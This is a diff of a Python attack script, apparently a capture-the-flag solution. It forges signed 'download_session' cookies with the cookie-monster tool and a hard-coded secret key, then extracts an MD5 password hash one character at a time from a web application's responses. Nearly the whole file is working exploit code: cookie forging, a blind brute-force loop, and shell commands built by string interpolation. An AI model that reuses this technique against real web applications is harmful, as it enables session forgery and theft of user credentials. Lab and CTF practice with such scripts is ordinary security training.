@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import re
 import time
 import os
@@ -20,9 +22,6 @@ def make_req(forged_cookie):
   r = requests.get(url, cookies=cookies)
   return r.text
 
-def build_cookie(json):
-  result = subprocess.Popen(['cookie-monster','-k','8929874489719802418902487651347865819634518936754','-e','-f'])
-
 def cleanup():
   os.system(f"/usr/bin/rm {tmp_file}")
 
@@ -32,7 +31,7 @@ for i in range(32): # md5(passwd) so 32chars long, found in routers/auth.js
     # or im blind and cand read the help menu so we're doing it 1 at a time lul
     os.system(f"/usr/bin/echo '{build_json(char)}' > {tmp_file}")
     # call cookie-monster to build the cookie
-    result = subprocess.check_output(['cookie-monster','-k','8929874489719802418902487651347865819634518936754','-e','-f','tmp','-n','download_session'])
+    result = subprocess.check_output([f'cookie-monster','-k','8929874489719802418902487651347865819634518936754','-e','-f',f'{tmp_file}','-n','download_session'])
     # sleep to give cookie-monster time to properly run and return its output
     time.sleep(0.5)
     # use regex to extract the cookies
@@ -54,6 +53,6 @@ for i in range(32): # md5(passwd) so 32chars long, found in routers/auth.js
       passwd += char
       break
 
-    # cleanup the temp file used here and exit
-    cleanup()
-    exit()
+# cleanup the temp file used here and exit
+cleanup()
+exit()
